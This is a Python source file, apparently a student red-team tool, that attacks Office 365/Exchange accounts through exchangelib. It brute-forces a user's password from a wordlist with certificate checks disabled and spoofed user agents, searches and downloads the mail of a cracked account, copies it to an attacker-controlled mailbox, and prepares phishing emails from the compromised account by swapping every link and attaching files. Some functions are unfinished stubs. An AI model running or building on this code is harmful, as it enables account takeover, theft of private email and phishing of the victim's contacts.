import click
import sys
import re
import getpass
from exchangelib import Account, Folder, Credentials, Configuration, DELEGATE, Message, FileAttachment, \
    ItemAttachment, Mailbox, HTMLBody, errors
from exchangelib.errors import UnauthorizedError, CASError
import random
# Comment this out to validate certs
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from exchangelib.protocol import BaseProtocol, NoVerifyHTTPAdapter
import requests.utils
BaseProtocol.HTTP_ADAPTER_CLS = NoVerifyHTTPAdapter

def _new_user_agent(name=False):
    """Returns a random custom user agent based on the list below:

    :param name: (Boolean) honestly, have no idea what this does. Consult exchangelib docs...
    :return:     (string)  returns the user agent that was randomly chosen
    """
    ua = ['Mozilla/5.0 (Sus NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
          'Mozilla/5.0 (Sus NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
          'Mozilla/5.0 (Sus NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0',
          'Mozilla/5.0 (Sus NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
          'Mozilla/5.0 (Hacintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36'
          'Mozilla/5.0 (Hacintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7']
    return random.choice(ua)

requests.utils.default_user_agent = _new_user_agent

class Session:
    """Contains all of the pertinant information to initialize an Outlook Session

    """

    def __init__(self, red_username, red_password, nDomain, nUsernames, nPasswords):
        """Creates a Session object

        :param red_username: (String)                    The username to the attacking account
        :param red_password: (String)                    The password to the attacking account
        :param nDomain:      (String)                    The domain that is being authenticated to (ie. Champlain.edu)
        :param nUsernames:   (String[or list of String]) The userName(s) that are going to be used to login
        :param nPasswords:   (String[or list of String]) The password(s) that are going to be used to login
        """
        self.red_username = red_username
        self.red_password = red_password
        self.domain    = nDomain
        self.usernames = nUsernames
        self.passwords = nPasswords

    def ews_config_setup(self, user, password):
        try:
            config = Configuration(
                server='outlook.office365.com/EWS/Exchange.asmx',
                credentials=Credentials(
                    username="{}@{}".format(user, self.domain),
                    password=password))

            account = Account(
                primary_smtp_address="{}@{}".format(user, self.domain),
                autodiscover=False,
                config=config,
                access_type=DELEGATE)

        except UnauthorizedError:
            print("Bad password")
            return None, None

        except CASError:
            print("CAS Error: User {} does not exist.".format(user))
            return None, None

        return account, config

    def test_single_mode(self, username, password):
        """Attempts to login to an account using a single username/password.

        :param username: (string)  the username of the account to login as
        :param password: (string)  the password of the account to login as
        :return:         (Boolean) return a Boolean reflecting whether the account exists or not
        """
        account, config = self.ews_config_setup(username, password)
        if account is None and config is None:
            return False

        next(iter(account.inbox.all()))
        return True

    #def accountSpray(self, userfile, passfile):
    #    with open(userfile), open(passfile) as userlist, passlist:
    #        for user in userlist:
    #            for password in passlist:
    #                valid = self.test_single_mode(user.rstrip('\r\n'), password)
    #                if valid:
    #                    print("Valid combo found {}:{}".format(user.rstrip('\r\n'), password))
    #            print("Done with: ", user)

    def passSpray(self, username, pass_file):
        """Use a password file to try to brute force the given account.

        :param username:  (string) the username of the account to be bruteforced
        :param pass_file: (string) the filename of the password list to use
        """

        found = False
        with open(pass_file) as pass_list:
            count = 1
            for password in pass_list:
                valid = self.test_single_mode(username, password.rstrip('\r\n'))
                if valid:
                    found = True
                    print(username + "'s password is: " + password)
                else:
                    print(str(count) + " Password Failed")

                count+=1
        if(found):
            print("Account Cracked.")
        else:
            print("Account not Cracked")

    def attachFile(self, message, file_path, file_name):
        """Attaches a given file to a given message, and names as specified.

        :param message:   (Message) A message object (from exchangelib) that you wish to attach a file to
        :param file_path: (String)  A string containing the filepath of the file you wish to attach
        :param file_name: (String)  A string that specifies what you want the reciever to see as the name of the file
        :return:          (Message) The message with a new file attachment
        """

        with open(file_path, 'rb') as f:
            attachment = FileAttachment(name=file_name, content=f.read())
            message.attach(attachment)

        return message

    ############ Talk to Josh about variables in fucntion calls #########################
    def searchKeyword(self, keyword, folder="inbox"):
        """Searches the current Inbox for emails that contain the 'keyword' in the bodys.

            :param keyword: (string)    keyword to search the Inbox for
            :param folder:  (string) (default Inbox) A string containing the folder to be searched.
            :return emails: [(Message)] A list of 'Message' objects that contain the keyword.
        """
        print("Establishing Connection")
        account, config = self.ews_config_setup(self.usernames, self.passwords)
        try:
            emails = []
            for item in account.inbox.all():
                if(keyword in item.body):
                    emails.append(item)
                    print(item.subject)
            return emails
        except:
            print("Error")

    def getNumEmails(self, number=10, folder="inbox"):
        """This method gets the last 'number' of emails from the outlook folder "folder" in the active sessionself.

        :param number: (int)    (default 10)    the number of emails to investigate
        :param folder: (string) (default Inbox) A string containing the folder to be searched.
        """
        print("Establishing Connection")
        account, config = self.ews_config_setup(self.usernames, self.passwords)
        try:
            emails = []
            count = 0
            for item in account.inbox.all():
                if count >= number:
                    break
                else:
                    emails.append(item)
                    count += 1

            return emails
        except:
            print("Error")

    def downloadEmails(self, number=10, keyword="", folder="inbox"):
        """This method searches the authenticated user's inbox for the last 'number' of
            emails that match the 'keyword' and downloads them

            :param number:          (int)    (default 10)    the number of emails to investigate
            :param keyword:         (string) (default null)  the keyword, if any to search emails for
            :param folder:          (string) (default Inbox) A string containing the folder to be searched.
            :return list[Messages]: A list of Message objects.
        """
        emails = []
        if keyword:
            emails = self.searchKeyword(keyword,folder)
        else:
            emails = self.getNumEmails(number,folder)

        return emails

    def _build_folder(self, main_folder, account):
        """Builds folder tree for email
            username@domain
                [inbox
                [to_send

            :param main_folder: (string) The address that will be the NAME of the new folder (NOT THE ACCOUNT THAT THE NEW FOLDER WILL BE MADE IN)
            :return: (folder,folder) Returns two folders: inbox folder, tosend folder
        """
        # This will hold the folder object
        f = ''

        #Check for matching folders:
        # We are going to assume that there are two subfolders (inbox, to_send) if the folder already exists. If the folder is
        #    made in this script, then that will be the case
        f_inbox = ""
        f_tosend = ""

        for item in account.inbox.glob(main_folder):
            # If the folder exists, set the target folders to the ones that are already there.
            if item.name == main_folder:
                f = item
                kids = f.children
                for kid in kids:
                    if kid.name == "inbox":
                        f_inbox = kid
                    elif kid.name == "to_send":
                        f_tosend = kid

                return f_inbox, f_tosend

        # If the folder doesn't exist, then make it, and it's subfolders
        f = Folder(parent=account.inbox, name=main_folder)
        f.save()

        f_inbox = Folder(parent=f, name="inbox")
        f_inbox.save()
        f_tosend = Folder(parent=f, name="to_send")
        f_tosend.save()


        return f_inbox, f_tosend

    def uploadEmails(self, emails):
        """This method uploads emails from a list, to the folder specified.

            :param emails: (list[Messages]) A list of Message objects.
        """
        account, config = self.ews_config_setup(self.usernames, self.passwords)


        main_folder = self.usernames + "@" + self.domain
        sub_inbox, to_send = self._build_folder(main_folder, account)


        # Copy all of the saved messages into the specified folder
        for email in emails:
            print(email.sender)

            m = Message(
                account=account,
                folder=sub_inbox,
                subject=email.subject,
                body=email.body,
                to_recipients=[email.sender]
                )
            m.save()

    def send_phishing_email(self, send_list, link_replace=True, link='https://basspro.com', attach_file=False, file_path='', file_name='Resume'):
        """Send phishing emails from a compromised account.

        :param send_list:    ([Messages]) a list of messages that you wish to send. item.to_recipients is the target, self.username is the sender
        :param link_replace: (Boolean)    if you want to replace the links in the email or not
        :param link:         (String)     if you do want to link replace, this is the link that will replace all of the existing links
        :param attatch_file: (Boolean)    if you want to attach a file or not
        :param filename:     (String)     if you want to attach a file, the filename of the desired file
        """

        # Replace links

        for email in send_list:
            if link_replace:
                replace_string = 'href="' + link + '"'
                email.body = HTMLBody(re.sub(r'href="\S*"', replace_string, email.body))
            if attach_file:
                email = self.attachFile(email, file_path, file_name)








    def investigateEmails(self, number=10, keyword="", folder="inbox"):
        """This method searches the authenticated user's inbox for the last 'number' of
            emails that match the 'keyword', downloads them, them to the attacker's email
            for further processing

            :param number:  (int)    (default 10)   the number of emails to investigate
            :param keyword: (string) (default null) the keyword, if any to search emails for
            :param folder:          (string) (default Inbox) A string containing the folder to be searched.
        """
        # Search Email for whatever you
                #session.downloadEmails()
        # Pull the Emails Down

        # Authenticate with penTest accounts

        # Upload Emails for viewing

        # User then Determines how to phish.....
